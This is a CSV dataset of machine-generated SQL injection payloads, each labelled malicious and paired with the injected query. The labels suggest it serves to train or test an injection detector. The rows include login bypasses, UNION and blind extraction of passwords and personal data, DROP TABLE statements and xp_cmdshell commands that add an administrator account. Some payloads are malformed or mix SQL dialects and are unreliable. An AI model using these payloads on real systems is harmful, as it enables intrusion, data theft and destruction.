attack_category,template_context,payload,full_query,label,source,generator_model,round
tautology,login,1); WAITFOR DELAY '0:0:5' --,SELECT * FROM users WHERE username = '1); WAITFOR DELAY '0:0:5' --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,login,"1'; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); IF @x IS NOT NULL EXECUTE(@x); --","SELECT * FROM users WHERE username = '1'; DECLARE @x INT; SET @x = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); IF @x IS NOT NULL EXECUTE(@x); --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,login,"1'; WITH T AS (SELECT COUNT(*) FROM users WHERE 1=0) SELECT username, password FROM users WHERE username = 'admin' AND password = 'admin'","SELECT * FROM users WHERE username = '1'; WITH T AS (SELECT COUNT(*) FROM users WHERE 1=0) SELECT username, password FROM users WHERE username = 'admin' AND password = 'admin'' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,login,--' OR 1=1/**/,SELECT * FROM users WHERE username = '--' OR 1=1/**/' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,' OR (SELECT 1 FROM DUAL)/*,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM DUAL)/*' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,' OR (1+1=2),SELECT * FROM users WHERE username = '' OR (1+1=2)' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,' OR (LENGTH(username)=1),SELECT * FROM users WHERE username = '' OR (LENGTH(username)=1)' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,login,1' /* */OR EXISTS(SELECT * FROM users WHERE username='admin'),SELECT * FROM users WHERE username = '1' /* */OR EXISTS(SELECT * FROM users WHERE username='admin')' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,login,"1' "" OR 1=1#","SELECT * FROM users WHERE username = '1' "" OR 1=1#' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,login,1' OR LENGTH(password)=0,SELECT * FROM users WHERE username = '1' OR LENGTH(password)=0' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,search,' OR 1=1#,SELECT * FROM products WHERE name LIKE '%' OR 1=1#%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,search,% AND '1'='1,SELECT * FROM products WHERE name LIKE '%% AND '1'='1%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,search,'; DROP TABLE users;,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users;%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,search,;/* OR 'x'='y*/,SELECT * FROM products WHERE name LIKE '%;/* OR 'x'='y*/%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,search,' OR 1=1/**/,SELECT * FROM products WHERE name LIKE '%' OR 1=1/**/%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,%' OR TRUE --,SELECT * FROM products WHERE name LIKE '%%' OR TRUE --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,%' OR TRUE /**/,SELECT * FROM products WHERE name LIKE '%%' OR TRUE /**/%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,'% OR CAST('1' AS INT)=CAST('1' AS INT)--,SELECT * FROM products WHERE name LIKE '%'% OR CAST('1' AS INT)=CAST('1' AS INT)--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,"' OR ASCII(SUBSTRING((SELECT USER()),1,1))=65#","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT USER()),1,1))=65#%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,search,' OR LENGTH((SELECT DATABASE()))>0--,SELECT * FROM products WHERE name LIKE '%' OR LENGTH((SELECT DATABASE()))>0--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,search,"; WAITFOR DELAY '0:0:0' UNION ALL SELECT NULL,'',NULL,NULL#","SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:0' UNION ALL SELECT NULL,'',NULL,NULL#%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR '1'='1',SELECT * FROM users WHERE id = ' OR '1'='1',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,user_lookup,' OR EXISTS(SELECT * FROM (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')) --,SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')) --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,; DROP TABLE IF EXISTS temp; SELECT * FROM users WHERE id = ' OR 1>1,SELECT * FROM users WHERE id = ; DROP TABLE IF EXISTS temp; SELECT * FROM users WHERE id = ' OR 1>1,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,' OR (SELECT 1 FROM users WHERE username = '' AND password = '') --,SELECT * FROM users WHERE id = ' OR (SELECT 1 FROM users WHERE username = '' AND password = '') --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,"' OR ASCII(SUBSTRING(username, 1, 1)) = 85 --","SELECT * FROM users WHERE id = ' OR ASCII(SUBSTRING(username, 1, 1)) = 85 --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,' OR 1 IN (SELECT 1) --,SELECT * FROM users WHERE id = ' OR 1 IN (SELECT 1) --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR ASCII('a')=97 --,SELECT * FROM users WHERE id = ' OR ASCII('a')=97 --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR (1+(1=1))=2 --,SELECT * FROM users WHERE id = ' OR (1+(1=1))=2 --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR 1=(SELECT 1 FROM users LIMIT 1) --,SELECT * FROM users WHERE id = ' OR 1=(SELECT 1 FROM users LIMIT 1) --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,"1' OR ASCII(SUBSTRING(user(),1,1)) > 90 --","SELECT * FROM orders WHERE status = '1' OR ASCII(SUBSTRING(user(),1,1)) > 90 --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,order_filter,1' OR 1 IN (SELECT 1 FROM information_schema.tables WHERE table_type LIKE '%TABLE%')--,SELECT * FROM orders WHERE status = '1' OR 1 IN (SELECT 1 FROM information_schema.tables WHERE table_type LIKE '%TABLE%')--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,order_filter,1' OR 'a'='a' --,SELECT * FROM orders WHERE status = '1' OR 'a'='a' --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,order_filter,' OR EXISTS(SELECT 1),SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1)' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,order_filter,'; DROP TABLE IF EXISTS users;,SELECT * FROM orders WHERE status = ''; DROP TABLE IF EXISTS users;' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,order_filter,OR ('x'='x,SELECT * FROM orders WHERE status = 'OR ('x'='x' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,order_filter,' OR (1+1)=2 --,SELECT * FROM orders WHERE status = '' OR (1+1)=2 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,' OR (1=1 AND (SELECT 1 FROM dual)) --,SELECT * FROM orders WHERE status = '' OR (1=1 AND (SELECT 1 FROM dual)) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,"' OR 'a'='b' UNION ALL SELECT NULL, NULL, NULL, NULL --","SELECT * FROM orders WHERE status = '' OR 'a'='b' UNION ALL SELECT NULL, NULL, NULL, NULL --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,' OR (NOT(1=2)) ; --,SELECT * FROM orders WHERE status = '' OR (NOT(1=2)) ; --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,' OR EXISTS((SELECT 1 FROM (SELECT * FROM orders WHERE 1=1 LIMIT 1))) --,SELECT * FROM orders WHERE status = '' OR EXISTS((SELECT 1 FROM (SELECT * FROM orders WHERE 1=1 LIMIT 1))) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,' OR 1; DROP TABLE comments --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1; DROP TABLE comments --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,' OR (SELECT 1 FROM users WHERE 1=1) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM users WHERE 1=1) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,' OR ASCII('a')=ASCII('a') --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR ASCII('a')=ASCII('a') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,' OR @@VERSION LIKE '%Microsoft%' --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR @@VERSION LIKE '%Microsoft%' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,'; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema = 'information_schema' AND table_name = 'tables' AND column_name = 'table_name')) --,"INSERT INTO comments (user_id, body) VALUES (1, ''; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema = 'information_schema' AND table_name = 'tables' AND column_name = 'table_name')) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,'); EXECUTE xp_cmdshell 'ping -c 4 www.google.com' --,"INSERT INTO comments (user_id, body) VALUES (1, ''); EXECUTE xp_cmdshell 'ping -c 4 www.google.com' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,'); DECLARE @x INT; SET @x = 1; IF (@x = 1) PRINT 'Injection successful!' ELSE PRINT 'Injection failed!'; --,"INSERT INTO comments (user_id, body) VALUES (1, ''); DECLARE @x INT; SET @x = 1; IF (@x = 1) PRINT 'Injection successful!' ELSE PRINT 'Injection failed!'; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,"'); INSERT INTO comments (user_id, body) SELECT user_id, body FROM comments WHERE 1=0 UNION ALL SELECT 1, 'Exploit executed'; --","INSERT INTO comments (user_id, body) VALUES (1, ''); INSERT INTO comments (user_id, body) SELECT user_id, body FROM comments WHERE 1=0 UNION ALL SELECT 1, 'Exploit executed'; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,'); UPDATE comments SET body = '<script>alert('XSS');</script>' WHERE user_id = 1; --,"INSERT INTO comments (user_id, body) VALUES (1, ''); UPDATE comments SET body = '<script>alert('XSS');</script>' WHERE user_id = 1; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,' UNION ALL SELECT * FROM information_schema.users --,SELECT * FROM users WHERE username = '' UNION ALL SELECT * FROM information_schema.users --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,login,--'; EXEC sp_helpdb;,SELECT * FROM users WHERE username = '--'; EXEC sp_helpdb;' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,login,'; WAITFOR DELAY '0:0:10'--,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10'--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,login,' OR 1=1 UNION SELECT password FROM admin --,SELECT * FROM users WHERE username = '' OR 1=1 UNION SELECT password FROM admin --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,' OR '1'='1' UNION SELECT email FROM staff /*,SELECT * FROM users WHERE username = '' OR '1'='1' UNION SELECT email FROM staff /*' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,' OR 2*(SELECT 1/0) = 2 UNION SELECT username FROM accounts #,SELECT * FROM users WHERE username = '' OR 2*(SELECT 1/0) = 2 UNION SELECT username FROM accounts #' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,"' OR ASCII(SUBSTRING(password,1,1)) > 96 UNION SELECT first_name FROM employees //","SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(password,1,1)) > 96 UNION SELECT first_name FROM employees //' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,' OR (SELECT COUNT(*) FROM orders) = (SELECT COUNT(*) FROM orders) --,SELECT * FROM users WHERE username = '' OR (SELECT COUNT(*) FROM orders) = (SELECT COUNT(*) FROM orders) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,--') UNION ALL SELECT * FROM domain.admins--,SELECT * FROM users WHERE username = '--') UNION ALL SELECT * FROM domain.admins--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,"/*'*/ UNION SELECT username, password FROM users WHERE username != 'admin' #","SELECT * FROM users WHERE username = '/*'*/ UNION SELECT username, password FROM users WHERE username != 'admin' #' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,"' OR 1=1 UNION SELECT CONCAT(username, ':', password) FROM auth.credentials /*","SELECT * FROM users WHERE username = '' OR 1=1 UNION SELECT CONCAT(username, ':', password) FROM auth.credentials /*' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,"' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) <= 65 --","SELECT * FROM users WHERE username = '' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) <= 65 --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,' OR '1'='1/*',SELECT * FROM products WHERE name LIKE '%' OR '1'='1/*'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,search,"--%') UNION SELECT username, password FROM users --","SELECT * FROM products WHERE name LIKE '%--%') UNION SELECT username, password FROM users --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,"' OR EXISTS(SELECT 1 FROM info WHERE email = SUBSTRING((SELECT admin_email FROM settings), 1, 1))--","SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM info WHERE email = SUBSTRING((SELECT admin_email FROM settings), 1, 1))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,'; EXEC sp_sayHello; UNION SELECT * FROM flags --,SELECT * FROM products WHERE name LIKE '%'; EXEC sp_sayHello; UNION SELECT * FROM flags --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,1' AND LOWER(VERSION())=LOWER((SELECT VERSION() FROM information_schema))--,SELECT * FROM products WHERE name LIKE '%1' AND LOWER(VERSION())=LOWER((SELECT VERSION() FROM information_schema))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,-1' OR (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')--,SELECT * FROM products WHERE name LIKE '%-1' OR (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,1' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') UNION ALL SELECT NULL NULL NULL NULL #,SELECT * FROM products WHERE name LIKE '%1' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') UNION ALL SELECT NULL NULL NULL NULL #%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,"' OR 1=1 AND (SELECT 1 FROM (SELECT CONCAT(username, ':', password) AS data FROM users))--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 AND (SELECT 1 FROM (SELECT CONCAT(username, ':', password) AS data FROM users))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,"1' OR 1=1 AND (SELECT ASCII(SUBSTRING((SELECT admin_password FROM settings LIMIT 1), 1, 1))) BETWEEN 48 AND 57 --","SELECT * FROM products WHERE name LIKE '%1' OR 1=1 AND (SELECT ASCII(SUBSTRING((SELECT admin_password FROM settings LIMIT 1), 1, 1))) BETWEEN 48 AND 57 --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,' AND EXISTS(SELECT 1 FROM accounts WHERE account_id=123),SELECT * FROM users WHERE id = ' AND EXISTS(SELECT 1 FROM accounts WHERE account_id=123),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,user_lookup,"' UNION SELECT username, password FROM admin_table #","SELECT * FROM users WHERE id = ' UNION SELECT username, password FROM admin_table #",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,user_lookup,/* */UNION select /** */*/** */from/** */information_schema.tables/** */where/** */table_schema=database()/** */and/** */table_name<>'users',SELECT * FROM users WHERE id = /* */UNION select /** */*/** */from/** */information_schema.tables/** */where/** */table_schema=database()/** */and/** */table_name<>'users',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,user_lookup,' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database() AND table_name != 'users') --,SELECT * FROM users WHERE id = ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database() AND table_name != 'users') --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,"'; DECLARE @a NVARCHAR(4000); SET @a = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); EXEC sp_executesql @a; --","SELECT * FROM users WHERE id = '; DECLARE @a NVARCHAR(4000); SET @a = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); EXEC sp_executesql @a; --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,"' AND 1 = CONVERT(INT, 0x4E4F5F4E4F4F4E4F4F4F4F4F4F4F4F4F4F4F4F)","SELECT * FROM users WHERE id = ' AND 1 = CONVERT(INT, 0x4E4F5F4E4F4F4E4F4F4F4F4F4F4F4F4F4F4F4F)",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,' AND (SELECT CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101) FROM DUAL),SELECT * FROM users WHERE id = ' AND (SELECT CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101) FROM DUAL),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,"'; WAITFOR DELAY '0:0:5'; SELECT username, password FROM admin_table; --","SELECT * FROM users WHERE id = '; WAITFOR DELAY '0:0:5'; SELECT username, password FROM admin_table; --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,"'; UNION SELECT username, password FROM users --","SELECT * FROM orders WHERE status = ''; UNION SELECT username, password FROM users --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,order_filter,"''""; WAITFOR DELAY '0:0:5' AND 1=1--","SELECT * FROM orders WHERE status = '''""; WAITFOR DELAY '0:0:5' AND 1=1--' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,order_filter,') OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%')--,SELECT * FROM orders WHERE status = '') OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%')--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,order_filter,"--' UNION SELECT email, phone FROM customers --","SELECT * FROM orders WHERE status = '--' UNION SELECT email, phone FROM customers --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"' OR '1'='1'/*"" UNION SELECT address, city FROM shipping_details */","SELECT * FROM orders WHERE status = '' OR '1'='1'/*"" UNION SELECT address, city FROM shipping_details */' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"(CASE WHEN (SELECT COUNT(*) FROM products) > 0 THEN CONCAT('admin',':','password') ELSE 'invalid' END) /**/","SELECT * FROM orders WHERE status = '(CASE WHEN (SELECT COUNT(*) FROM products) > 0 THEN CONCAT('admin',':','password') ELSE 'invalid' END) /**/' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"/**/' UNION SELECT SSN, DOB FROM identity_info --","SELECT * FROM orders WHERE status = '/**/' UNION SELECT SSN, DOB FROM identity_info --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"; --' UNION SELECT name, email FROM employees; --","SELECT * FROM orders WHERE status = '; --' UNION SELECT name, email FROM employees; --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,'; WAITFOR DELAY '0:0:5' AND (SELECT 1 AS result FROM system_tables),SELECT * FROM orders WHERE status = ''; WAITFOR DELAY '0:0:5' AND (SELECT 1 AS result FROM system_tables)' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,"--' UNION SELECT hostname, IP FROM network_configurations; --","SELECT * FROM orders WHERE status = '--' UNION SELECT hostname, IP FROM network_configurations; --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,'); EXECUTE master..xp_cmdshell 'net user administrator /add'; --,SELECT * FROM orders WHERE status = ''); EXECUTE master..xp_cmdshell 'net user administrator /add'; --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,"IF(COUNT(*) > 0, (SELECT password FROM users WHERE username='admin'), NULL) --","INSERT INTO comments (user_id, body) VALUES (1, 'IF(COUNT(*) > 0, (SELECT password FROM users WHERE username='admin'), NULL) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,comment_insert,"1' AND '1'=(SELECT CAST(ascii(SUBSTRING((SELECT TOP 1 password FROM users ORDER BY user_id), 1, 1)) AS VARCHAR)--","INSERT INTO comments (user_id, body) VALUES (1, '1' AND '1'=(SELECT CAST(ascii(SUBSTRING((SELECT TOP 1 password FROM users ORDER BY user_id), 1, 1)) AS VARCHAR)--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,comment_insert,1' UNION ALL SELECT (SELECT title FROM posts WHERE post_id<10 LIMIT 1) --,"INSERT INTO comments (user_id, body) VALUES (1, '1' UNION ALL SELECT (SELECT title FROM posts WHERE post_id<10 LIMIT 1) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,comment_insert,"-- UNION SELECT u.id, CONCAT(u.username, ':', h.password) FROM users u JOIN hashes h ON u.id = h.user_id --","INSERT INTO comments (user_id, body) VALUES (1, '-- UNION SELECT u.id, CONCAT(u.username, ':', h.password) FROM users u JOIN hashes h ON u.id = h.user_id --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,"'; SELECT id, email FROM users /*","INSERT INTO comments (user_id, body) VALUES (1, ''; SELECT id, email FROM users /*')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,' OR EXISTS(SELECT 1 FROM employees WHERE department = 'HR') --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM employees WHERE department = 'HR') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,"""; SELECT title FROM blog_posts WHERE author_id = (SELECT id FROM authors WHERE name LIKE '%BlogAdmin%') --","INSERT INTO comments (user_id, body) VALUES (1, '""; SELECT title FROM blog_posts WHERE author_id = (SELECT id FROM authors WHERE name LIKE '%BlogAdmin%') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,login,"%"" OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--","SELECT * FROM users WHERE username = '%"" OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,login,"' OR ASCII(SUBSTRING(password,1,1)) = 97 --","SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(password,1,1)) = 97 --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,login,1' OR 1=(SELECT 1 FROM (SELECT * FROM users LIMIT 1) WHERE 1) --,SELECT * FROM users WHERE username = '1' OR 1=(SELECT 1 FROM (SELECT * FROM users LIMIT 1) WHERE 1) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,login,--' OR (SELECT 1 FROM users WHERE username LIKE 'admin%')--,SELECT * FROM users WHERE username = '--' OR (SELECT 1 FROM users WHERE username LIKE 'admin%')--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,login,' OR (LENGTH(username) > 5 AND EXISTS(SELECT 1 FROM users WHERE username = 'admin'))--,SELECT * FROM users WHERE username = '' OR (LENGTH(username) > 5 AND EXISTS(SELECT 1 FROM users WHERE username = 'admin'))--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,login,"1' OR SUBSTR(username, 1, 1) = 'a' AND SUBSTR(password, 1, 1) = 'a' --","SELECT * FROM users WHERE username = '1' OR SUBSTR(username, 1, 1) = 'a' AND SUBSTR(password, 1, 1) = 'a' --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,login,1' OR 1=1 OR username LIKE '%admin%' AND password='any' --,SELECT * FROM users WHERE username = '1' OR 1=1 OR username LIKE '%admin%' AND password='any' --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,1' AND (SELECT NULL FROM information_schema.tables WHERE table_name LIKE '%users%') IS NULL--,SELECT * FROM products WHERE name LIKE '%1' AND (SELECT NULL FROM information_schema.tables WHERE table_name LIKE '%users%') IS NULL--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,search,"1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97--","SELECT * FROM products WHERE name LIKE '%1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))=97--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,search,"1' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97) THEN 1 ELSE 0 END)--","SELECT * FROM products WHERE name LIKE '%1' AND 1=(SELECT CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97) THEN 1 ELSE 0 END)--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,"1' AND EXISTS(SELECT 1 FROM users WHERE id=1 AND ASCII(SUBSTRING(username,1,1)) BETWEEN ASCII('a') AND ASCII('z'))--","SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT 1 FROM users WHERE id=1 AND ASCII(SUBSTRING(username,1,1)) BETWEEN ASCII('a') AND ASCII('z'))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,search,"1' AND 1=(SELECT 1 FROM users WHERE id=1 AND name LIKE CONCAT('%',(CHAR(97)),'%'))--","SELECT * FROM products WHERE name LIKE '%1' AND 1=(SELECT 1 FROM users WHERE id=1 AND name LIKE CONCAT('%',(CHAR(97)),'%'))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
